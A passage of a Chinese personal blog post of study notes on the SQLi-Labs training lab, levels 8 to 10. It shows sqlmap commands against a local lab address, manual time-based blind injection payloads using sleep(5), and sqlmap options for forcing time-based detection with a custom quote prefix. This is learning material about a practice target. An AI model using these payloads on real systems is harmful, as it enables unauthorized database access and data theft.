+<h3 id="1-8-1-sqlmap"><a href="#1-8-1-sqlmap" class="headerlink" title="1.8.1 sqlmap"></a>1.8.1 sqlmap</h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u "http://192.168.2.101:81/sql/sqli-labs-master/Less-8/?id=1" --batch</span><br></pre></td></tr></tbody></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://img.jasmine-iris.top/posts/SQLi-Labs/1787298411340_oymxjc.webp" loading='lazy'></p>
+<hr>
+<h2 id="1-9-Less-9"><a href="#1-9-Less-9" class="headerlink" title="1.9 Less-9"></a>1.9 Less-9</h2><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://img.jasmine-iris.top/posts/SQLi-Labs/1787298412936_z64acb.webp" loading='lazy'></p>
+<h3 id="1-9-1-sqlmap"><a href="#1-9-1-sqlmap" class="headerlink" title="1.9.1 sqlmap"></a>1.9.1 sqlmap</h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u "http://192.168.2.101:81/sql/sqli-labs-master/Less-9/?id=1" --batch</span><br></pre></td></tr></tbody></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://img.jasmine-iris.top/posts/SQLi-Labs/1787298414118_kyh3sx.webp" loading='lazy'></p>
+<p>Less-7~9 都只能用盲注（布尔/时间），sqlmap 一把梭。</p>
+<hr>
+<h2 id="1-10-Less-10"><a href="#1-10-Less-10" class="headerlink" title="1.10 Less-10"></a>1.10 Less-10</h2><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://img.jasmine-iris.top/posts/SQLi-Labs/1787298415714_iv2w9j.webp" loading='lazy'></p>
+<h3 id="1-10-1-手动测试"><a href="#1-10-1-手动测试" class="headerlink" title="1.10.1 手动测试"></a>1.10.1 手动测试</h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1' and if(1=2,1,sleep(5))--+</span><br><span class="line">?id=1" and if(1=2,1,sleep(5))--+</span><br></pre></td></tr></tbody></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://img.jasmine-iris.top/posts/SQLi-Labs/1787298418091_8rn9bs.webp" loading='lazy'><!-- 这是一张图片，ocr 内容为： --><br><img src="https://img.jasmine-iris.top/posts/SQLi-Labs/1787298419848_gu8t44.webp" loading='lazy'></p>
+<p>说明<code>"</code>是闭合符</p>
+<p>排除了：</p>
+<p>联合注入—-无回显</p>
+<p>报错注入—-加引号无报错</p>
+<p>布尔盲注—-<code>1=1/1=2 </code>页面一样</p>
+<p>确定是双引号时间盲注—-<code>sleep</code> 卡 5 秒</p>
+<h3 id="1-10-2-sqlmap"><a href="#1-10-2-sqlmap" class="headerlink" title="1.10.2 sqlmap"></a>1.10.2 sqlmap</h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u "http://192.168.2.101:81/sql/sqli-labs-master/Less-10/?id=1" --batch</span><br></pre></td></tr></tbody></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://img.jasmine-iris.top/posts/SQLi-Labs/1787298421191_6136qh.webp" loading='lazy'></p>
+<p>当目标只剩时间信号、且闭合符特殊时，工具不知道闭合符就测不出来。</p>
+<p><code>--technique=T</code>：sqlmap 默认会尝试所有技术：B(布尔盲注) 、E(报错) 、U(联合)、S(堆叠)、T(时间盲注)、Q(内联查询)</p>
+<p><code>--prefix='"'</code>：闭合符</p>
+<p><code>--time-sec=1</code>：时间信道的强度，默认是 5 秒(猜一个字符要发几十个请求，每个等 5 秒太慢）</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u "http://192.168.2.101:81/sql/sqli-labs-master/Less-10/?id=1" --batch --technique=T  --prefix='"' --time-sec=1</span><br></pre></td></tr></tbody></table></figure>
+
+<ul>
+<li>传双引号 → <code>--prefix='"'</code>（单引号包双引号）</li>
+<li>传单引号 → <code>--prefix="'"</code>（双引号包单引号）</li>
+</ul>
+<p>验证注入方式：时间盲注</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://img.jasmine-iris.top/posts/SQLi-Labs/1787298423595_f2ys7o.webp" loading='lazy'></p>
+<hr>
+<blockquote>
+<p>本文为个人学习笔记，如有错误或疏漏，欢迎批评指正。‌‌‌‌‌‌‌‌‌​​‌​‌​‌‍‌‌‌‌‌‌‌‌‌​​‌‌‌‌​‍‌‌‌‌‌‌‌‌‌​​​‌‌​​‍‌‌‌‌‌‌‌‌‌​​‌​​‌​‍‌‌‌‌‌‌‌‌‌​​‌​‌‌​‍‌‌‌‌‌‌‌‌‌​​‌​​​‌‍‌‌‌‌‌‌‌‌‌​​‌‌​‌​‍‌‌‌‌‌‌‌‌‌‌​‌​​‌​‍‌‌‌‌‌‌‌‌‌​​‌​‌‌​‍‌‌‌‌‌‌‌‌‌​​​‌‌​‌‍‌‌‌‌‌‌‌‌‌​​‌​‌‌​‍‌‌‌‌‌‌‌‌‌​​​‌‌​​‍‌‌‌‌‌‌‌‌‌‌​‌​​​‌‍‌‌‌‌‌‌‌‌‌​​​‌​‌‌‍‌‌‌‌‌‌‌‌‌​​‌​​​​‍‌‌‌‌‌‌‌‌‌​​​‌‌‌‌‍</p>
+</blockquote>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://jasmine-iris.top">Jasmine_Iris</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://jasmine-iris.top/2026/08/21/SQLi-Labs/">https://jasmine-iris.top/2026/08/21/SQLi-Labs/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://jasmine-iris.top" target="_blank">Jasmine_Iris</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/SQL%E6%B3%A8%E5%85%A5/">SQL注入</a><a class="post-meta__tags" href="/tags/%E9%9D%B6%E5%9C%BA/">靶场</a></div><div class="post-share"><div class="social-share" data-image="https://img.jasmine-iris.top/img/photo.png" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer=""></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/2026/08/19/Basic_Pentesting_1_Walkthrough/" title="Basic Pentesting 1 Walkthrough"><img class="cover" src="https://img.jasmine-iris.top/posts/Basic_Pentesting_1_Walkthrough/cover.webp" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post" loading='lazy'><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">Basic Pentesting 1 Walkthrough</div></div><div class="info-2"><div class="info-item-1">VulnHub Basic Pentesting 1 靶机渗透完整复现：ProFTPD 1.3.3c 后门（MSF 与手动两种路径）、WordPress Web 渗透+内核提权，以及 wpscan/gobuster/searchsploit 工具详解</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2026/05/23/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" title="SQL注入漏洞"><img class="cover" src="https://img.jasmine-iris.top/posts/SQL注入漏洞/cover.webp" alt="cover" loading='lazy'><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-05-23</div><div class="info-item-2">SQL注入漏洞</div></div><div class="info-2"><div class="info-item-1">SQL注入漏洞的原理、分类（联合/报错/布尔/时间盲注）、常见绕过技巧与防御方法</div></div></div></a><a class="pagination-related" href="/2026/05/21/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80/" title="数据库基础"><img class="cover" src="https://img.jasmine-iris.top/posts/数据库基础/cover.webp" alt="cover" loading='lazy'><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-05-21</div><div class="info-item-2">数据库基础</div></div><div class="info-2"><div class="info-item-1">数据库核心概念梳理——库/表/字段层级结构、常用SQL语法、约束与高级查询</div></div></div></a></div></div><hr class="custom-hr"><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="waline-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="https://img.jasmine-iris.top/img/photo.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar" loading='lazy'></div><div class="author-info-name">Jasmine_Iris</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">25</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">24</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">21</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Jasmineee007"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/Jasmineee007" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="https://gitee.com/jasminee0762" target="_blank" title="Gitee"><i class="fab fa-gitee" style="color: #c71d23;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">欢迎来到我的博客~ 📝<br><hr>最近更新：2026-08-21<br><br>新增文章：<br><a href="/2026/08/21/SQLi-Labs/">SQLi-Labs</a><br></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%80%E3%80%81Basic-Challenges"><span class="toc-text">一、Basic Challenges</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-1-Less-1"><span class="toc-text">1.1 Less-1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-1-1-%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5%EF%BC%88union-select%EF%BC%89"><span class="toc-text">1.1.1 联合注入（union select）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8%E6%B3%A8%E5%85%A5"><span class="toc-text">1. 判断是否存在注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E9%AA%8C%E8%AF%81%E9%97%AD%E5%90%88%E6%96%B9%E5%BC%8F"><span class="toc-text">2. 验证闭合方式</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-order-by-%E6%9F%A5%E8%AF%A2%E5%AD%97%E6%AE%B5%E6%95%B0"><span class="toc-text">3. order by 查询字段数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-union-%E6%9F%A5%E6%89%BE%E5%9B%9E%E6%98%BE%E4%BD%8D"><span class="toc-text">4. union 查找回显位</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-%E6%9F%A5%E6%89%BE%E5%BD%93%E5%89%8D%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D"><span class="toc-text">5. 查找当前数据库名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-%E6%9F%A5%E6%89%BEsecurity-%E5%BA%93%E4%B8%AD%E7%9A%84%E6%89%80%E6%9C%89%E8%A1%A8%E5%90%8D"><span class="toc-text">6. 查找security 库中的所有表名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#7-%E6%9F%A5%E6%89%BE-users-%E4%B8%AD%E7%9A%84%E6%89%80%E6%9C%89%E5%AD%97%E6%AE%B5%E5%90%8D"><span class="toc-text">7. 查找 users 中的所有字段名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#8-%E6%9F%A5%E6%89%BE%E6%95%B0%E6%8D%AE"><span class="toc-text">8. 查找数据</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-1-2-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-text">1.1.2 报错注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A0-updatexml-%E2%80%93xpath%E6%8A%A5%E9%94%99"><span class="toc-text">① updatexml()–xpath报错</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A1extractvalue-%E2%80%93xpath%E6%8A%A5%E9%94%99"><span class="toc-text">②extractvalue()–xpath报错</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A2-groupby%E9%87%8D%E5%A4%8D%E9%94%AE%E5%86%B2%E7%AA%81"><span class="toc-text">③ groupby重复键冲突</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-1-3-%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="toc-text">1.1.3 布尔盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8%E6%B3%A8%E5%85%A5-1"><span class="toc-text">1. 判断是否存在注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E5%88%A4%E6%96%AD%E7%94%A8%E5%93%AA%E7%A7%8D%E6%B3%A8%E5%85%A5"><span class="toc-text">2. 判断用哪种注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E7%88%86%E6%95%B0%E6%8D%AE%E2%80%93%E4%B8%80%E6%AC%A1%E6%B5%8B%E4%B8%80%E4%B8%AA%E5%AD%97%E7%AC%A6%EF%BC%8C%E7%94%A8%E4%BA%8C%E5%88%86%E6%B3%95%E9%80%BC%E8%BF%91"><span class="toc-text">3. 爆数据–一次测一个字符，用二分法逼近</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-1-4-%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="toc-text">1.1.4 时间盲注</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-1-5-sqlmap"><span class="toc-text">1.1.5 sqlmap</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E6%A3%80%E6%B5%8B%E6%B3%A8%E5%85%A5%E7%82%B9"><span class="toc-text">1. 检测注入点</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E6%9F%A5%E5%BD%93%E5%89%8D%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-text">2. 查当前数据库</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E6%9F%A5-security-%E5%BA%93%E9%87%8C%E9%9D%A2%E6%89%80%E6%9C%89%E8%A1%A8"><span class="toc-text">3. 查 security 库里面所有表</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-%E6%9F%A5-users-%E8%A1%A8%E9%87%8C%E5%AD%97%E6%AE%B5%E5%90%8D"><span class="toc-text">4. 查 users 表里字段名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-%E5%AF%BC%E5%87%BA-username-%E5%92%8C-password-%E7%9A%84%E5%85%A8%E9%83%A8%E6%95%B0%E6%8D%AE"><span class="toc-text">5. 导出 username 和 password 的全部数据</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-1-6-POST%E6%B3%A8%E5%85%A5%EF%BC%88%E8%A1%A8%E5%8D%95%E7%99%BB%E5%BD%95%E6%A1%86%EF%BC%8C%E6%97%A0url%E5%8F%82%E6%95%B0%EF%BC%89"><span class="toc-text">1.1.6 POST注入（表单登录框，无url参数）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-2-Less-2"><span class="toc-text">1.2 Less-2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-1-%E7%A1%AE%E8%AE%A4%E6%B3%A8%E5%85%A5%E7%82%B9"><span class="toc-text">1.2.1 确认注入点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-2-%E9%AA%8C%E8%AF%81%E9%97%AD%E5%90%88%E6%96%B9%E5%BC%8F"><span class="toc-text">1.2.2 验证闭合方式</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-3-Less-3"><span class="toc-text">1.3 Less-3</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-3-1-%E7%A1%AE%E8%AE%A4%E6%B3%A8%E5%85%A5%E7%82%B9"><span class="toc-text">1.3.1 确认注入点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-3-2-%E9%AA%8C%E8%AF%81%E9%97%AD%E5%90%88%E6%96%B9%E5%BC%8F"><span class="toc-text">1.3.2 验证闭合方式</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-4-Less-4"><span class="toc-text">1.4 Less-4</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-4-1-%E7%A1%AE%E8%AE%A4%E6%B3%A8%E5%85%A5%E7%82%B9"><span class="toc-text">1.4.1 确认注入点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-4-2-%E9%AA%8C%E8%AF%81%E9%97%AD%E5%90%88%E6%96%B9%E5%BC%8F"><span class="toc-text">1.4.2 验证闭合方式</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-5-Less-5"><span class="toc-text">1.5 Less-5</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-5-1-%E7%A1%AE%E8%AE%A4%E6%B3%A8%E5%85%A5%E7%82%B9"><span class="toc-text">1.5.1 确认注入点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-5-2-%E9%AA%8C%E8%AF%81%E9%97%AD%E5%90%88%E6%96%B9%E5%BC%8F"><span class="toc-text">1.5.2 验证闭合方式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-5-3-%E5%9B%9B%E7%A7%8D%E6%96%B9%E6%B3%95"><span class="toc-text">1.5.3 四种方法</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A0-%E6%9C%89%E6%8A%A5%E9%94%99%EF%BC%8C%E5%8F%AF%E4%BB%A5%E7%94%A8%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E2%9C%85"><span class="toc-text">① 有报错，可以用报错注入✅</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A1-%E6%9C%89%E6%AD%A3%E5%B8%B8-%E5%BC%82%E5%B8%B8%E4%BF%A1%E5%8F%B7%EF%BC%8C%E5%8F%AF%E4%BB%A5%E7%94%A8%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%E2%9C%85"><span class="toc-text">② 有正常/异常信号，可以用布尔盲注✅</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A2-%E5%AD%98%E5%9C%A8%E6%97%B6%E9%97%B4%E5%BB%B6%E8%BF%9F%EF%BC%8C%E5%8F%AF%E4%BB%A5%E7%94%A8%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8%E2%9C%85"><span class="toc-text">③ 存在时间延迟，可以用时间盲注✅</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A3-sqlmap"><span class="toc-text">④ sqlmap</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-6-Less-6"><span class="toc-text">1.6 Less-6</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-6-1-%E7%A1%AE%E8%AE%A4%E6%B3%A8%E5%85%A5%E7%82%B9"><span class="toc-text">1.6.1 确认注入点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-6-2-%E9%AA%8C%E8%AF%81%E9%97%AD%E5%90%88%E6%96%B9%E5%BC%8F"><span class="toc-text">1.6.2 验证闭合方式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-6-3-sqlmap-%E6%A3%80%E7%B4%A2%E6%9C%89%E5%93%AA%E4%BA%9B%E6%B3%A8%E5%85%A5%E6%96%B9%E5%BC%8F"><span class="toc-text">1.6.3 sqlmap 检索有哪些注入方式</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-7-Less-7"><span class="toc-text">1.7 Less-7</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-8-Less-8"><span class="toc-text">1.8 Less-8</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-8-1-sqlmap"><span class="toc-text">1.8.1 sqlmap</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-9-Less-9"><span class="toc-text">1.9 Less-9</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-9-1-sqlmap"><span class="toc-text">1.9.1 sqlmap</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-10-Less-10"><span class="toc-text">1.10 Less-10</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-10-1-%E6%89%8B%E5%8A%A8%E6%B5%8B%E8%AF%95"><span class="toc-text">1.10.1 手动测试</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-10-2-sqlmap"><span class="toc-text">1.10.2 sqlmap</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/08/21/SQLi-Labs/" title="SQLi-Labs">SQLi-Labs</a><time datetime="2026-08-21T07:48:15.000Z" title="发表于 2026-08-21 15:48:15">2026-08-21</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/08/19/Basic_Pentesting_1_Walkthrough/" title="Basic Pentesting 1 Walkthrough"><img src="https://img.jasmine-iris.top/posts/Basic_Pentesting_1_Walkthrough/cover.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Basic Pentesting 1 Walkthrough" loading='lazy'></a><div class="content"><a class="title" href="/2026/08/19/Basic_Pentesting_1_Walkthrough/" title="Basic Pentesting 1 Walkthrough">Basic Pentesting 1 Walkthrough</a><time datetime="2026-08-19T04:10:39.000Z" title="发表于 2026-08-19 12:10:39">2026-08-19</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">©&nbsp;2025 - 2026 By Jasmine_Iris</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 8.1.2</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.4</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.4"></script><script src="/js/main.js?v=5.5.4"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@6.1.9/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"><script>(() => {
+  let initFn = window.walineFn || null
+  const isShuoshuo = GLOBAL_CONFIG_SITE.pageType === 'shuoshuo'
+  const option = null
+
+  const destroyWaline = ele => ele.destroy()
+
+  const initWaline = (Fn, el = document, path = window.location.pathname) => {
+    const waline = Fn({
+      el: el.querySelector('#waline-wrap'),
+      serverURL: 'https://waline.jasmine-iris.top',
+      pageview: false,
+      dark: 'html[data-theme="dark"]',
+      comment: false,
+      ...option,
+      path: isShuoshuo ? path : (option && option.path) || path
+    })
+
+    if (isShuoshuo) {
+      window.shuoshuoComment.destroyWaline = () => {
+        destroyWaline(waline)
+        if (el.children.length) {
+          el.innerHTML = ''
+          el.classList.add('no-comment')
+        }
+      }
+    }
+  }
+
+  const loadWaline = (el, path) => {
+    if (initFn) initWaline(initFn, el, path)
+    else {
+      btf.getCSS('https://cdn.jsdelivr.net/npm/@waline/client@3.8.0/dist/waline.min.css')
+        .then(() => import('https://cdn.jsdelivr.net/npm/@waline/client@3.8.0/dist/waline.min.js'))
+        .then(({ init }) => {
+          initFn = init || Waline.init
+          initWaline(initFn, el, path)
+          window.walineFn = initFn
+        })
+    }
+  }
+
+
+  if (isShuoshuo) {
+    'Waline' === 'Waline'
+      ? window.shuoshuoComment = { loadComment: loadWaline }
+      : window.loadOtherComment = loadWaline
+    return
+  }
+
+  if ('Waline' === 'Waline' || !false) {
+    if (false) btf.loadComment(document.getElementById('waline-wrap'),loadWaline)
+    else setTimeout(loadWaline, 0)
+  } else {
+    window.loadOtherComment = loadWaline
+  }
+})()</script></div><script>if(document.getElementById("page-header")&&document.getElementById("page-header").classList.contains("full_page")){var bg=document.getElementById("web_bg");if(bg)bg.style.backgroundImage="url(/img/home-bg.png)";}</script><script>document.documentElement.classList.add(GLOBAL_CONFIG.pageType==='home'?'is-home':'not-home');(function(){if(GLOBAL_CONFIG.pageType!=='home')return;var t=sessionStorage.getItem('auto-scrolled');if(t)return;sessionStorage.setItem('auto-scrolled','1');setTimeout(function(){var el=document.getElementById('content-inner');if(el)btf.scrollToDest(el.offsetTop,600)},1500)})()</script><script>(function(){document.addEventListener('click',function(e){if(e.target.closest('.card-tag-cloud a, .article-tag-list a, .site-data a[href="/tags/"]')){e.preventDefault()}})})()</script><script src="/js/copy-guard.js?v=2"></script><script src="/js/copy-feedback.js?v=1"></script><script src="/js/cursor.js"></script><script>(function(){var article=document.getElementById('article-container'),cardToc=document.getElementById('card-toc');if(!article||!cardToc)return;var lastH=article.offsetHeight,t=null;function recalc(){if(Math.abs(article.offsetHeight-lastH)<=3)return;lastH=article.offsetHeight;clearTimeout(t);t=setTimeout(function(){window.dispatchEvent(new Event('resize'))},150)}if(window.ResizeObserver)new ResizeObserver(recalc).observe(article);document.addEventListener('load',recalc,true)})()</script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><i class="fas fa-spinner fa-pulse" id="loading-status" hidden="hidden"></i><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="local-search-input"><input placeholder="搜索..." type="text"></div><hr><div id="local-search-results"></div><div class="ais-Pagination" id="local-search-pagination" style="display:none;"><ul class="ais-Pagination-list"></ul></div><div id="local-search-stats"></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=5.5.4"></script></div></div></body></html>
